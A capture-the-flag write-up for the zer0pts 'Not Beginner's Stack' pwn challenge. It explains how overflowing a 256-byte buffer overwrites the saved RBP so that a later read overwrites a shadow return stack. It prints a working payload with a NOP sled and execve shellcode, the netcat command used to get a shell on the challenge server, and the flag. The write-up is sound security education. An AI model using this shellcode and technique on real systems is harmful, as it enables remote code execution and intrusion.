# Not Beginner's Stack
- Category: Pwn
- Points: 100
- Solves:
- Solved by: drw0if, hdesk, mindlæss

## Description:

Elementary pwners love to overwrite the return address. This time you can't!

```
nc pwn.ctf.zer0pts.com 9011
```

### Author: ptr-yudai

## Analysis:

Running the program, we see that basically it asks for 2 inputs. 
Analyzing the source code we notice that the first function called is notvuln, which then calls the vuln function; this function asks for some input and then returns. Back in notvuln, we are asked another input and after it is given the program ends. The vuln function has, indeed, a vulnerability. It reads 0x1000 (which are 4096) bytes from standard input; the buffer in which this input is stored, however, can only contain 256 bytes. This means that we can overwrite something in the memory with this function. 

Unfortunately, as the challenge says, we can't overwrite the return address since the program defines its own call and ret instructions. Well, we can't overwrite the return address DIRECTLY. What we see if we look at the macros is that the return address is stored in __stack_shadow[__stack_depth++], so in the address starting at __stack_shadow, plus __stack_depth*8, which is then incremented.

```
mov ecx, [__stack_depth]
mov qword [__stack_shadow + rcx * 8], %%return_address
inc dword [__stack_depth]
```

Going back in vuln and notvuln, instead, we see that the buffer in which the read syscall writes is at rbp-0x100... 

```
mov edx, 0x100
lea rsi, [rbp-0x100]
xor edi, edi
call read 
```

So what if we overwrite the rbp?

## Solution:

Running the program in gdb we see that the address to which the program tries to return after a call is pointed at by rcx*8 + 0x600234. 

```
jmp    qword ptr [rcx*8 + 0x600234]
```

The value 0x600234 is exactly the address where __stack_shadow is.

So what we do is structuring our input this way: 256 trash bytes; the address of __stack_shadow+0x100; other trash filling the remaining bytes.

```
payload = b'\xcc'*256
payload += p64(0x600234+0x100)
payload += b'A'*(4096-len(payload))
```

In this way our rbp will be 0x600334, and the buffer where the read syscall in the notvuln function will try to write will be 0x600334-0x100, which is 0x600234, __stack_shadow indeed: our return address. 

Now that we know how to write in the return address, we just need to decide what to write there. First of all, we put 8 trash bytes, because running the program with gdb at this point we noticed that our input was actually getting written 8-bytes after the address at which __stack_shadow points. After those 8 bytes, we put the address to which we want the program to go, and then extacly at that address we put some NOPs followed by a shellcode.  

```
payload += p64(0x600234+50)
payload += p64(0x600234+50)
payload += b'\x90'*100
payload += b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
payload += b'\n'
```

What the program will do is write our input in __stack_shadow, go at the address in which we put our NOP sled, and then fall right into our shellcode.

Launching this piped in the netcat communication opened us a shell from which we then read the flag in the same directory.

```
(python3 exploit.py; cat -)|nc pwn.ctf.zer0pts.com 9011
```

```
cat flag-4c57150ed5cda2a8570c94eb5a9a5f9f.txt
```

## Flag:

```
zer0pts{1nt3rm3d14t3_pwn3r5_l1k3_2_0v3rwr1t3_s4v3d_RBP}
```